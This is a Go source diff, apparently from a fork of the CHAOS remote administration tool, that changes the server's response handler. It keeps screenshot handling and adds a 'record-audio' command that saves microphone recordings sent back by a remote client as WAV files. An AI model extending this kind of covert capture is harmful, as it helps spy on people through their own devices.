@@ -4,12 +4,12 @@ import (
 	"context"
 	"fmt"
 	"os/exec"
-	"reflect"
 	"strings"
 	"time"
 
 	"github.com/google/uuid"
 	"github.com/justadoll/CHAOS/internal/utils"
+	"github.com/justadoll/CHAOS/internal/utils/audio"
 	"github.com/justadoll/CHAOS/internal/utils/constants"
 	"github.com/justadoll/CHAOS/internal/utils/image"
 	"github.com/justadoll/CHAOS/internal/utils/jwt"
@@ -74,11 +74,18 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 }
 
 func HandleResponse(payload *payload.Data) (*payload.Data, error) {
-	fmt.Println("payload.Request: ", payload.Request)
-	fmt.Println("payload.Request type: ", reflect.TypeOf(payload.Request))
-	switch payload.Request {
+	commandParts := strings.Split(payload.Request, " ")
+	switch commandParts[0] {
 	case "screenshot":
 		file, err := image.WritePNG(payload.Response)
+		if err != nil {
+			return nil, err
+		}
+		payload.Response = utils.StringToByte(file)
+		break
+	case "record-audio":
+		// fmt.Println("payload.Response:", payload.Response) // []byte
+		file, err := audio.WriteWav(payload.Response)
 		if err != nil {
 			return nil, err
 		}
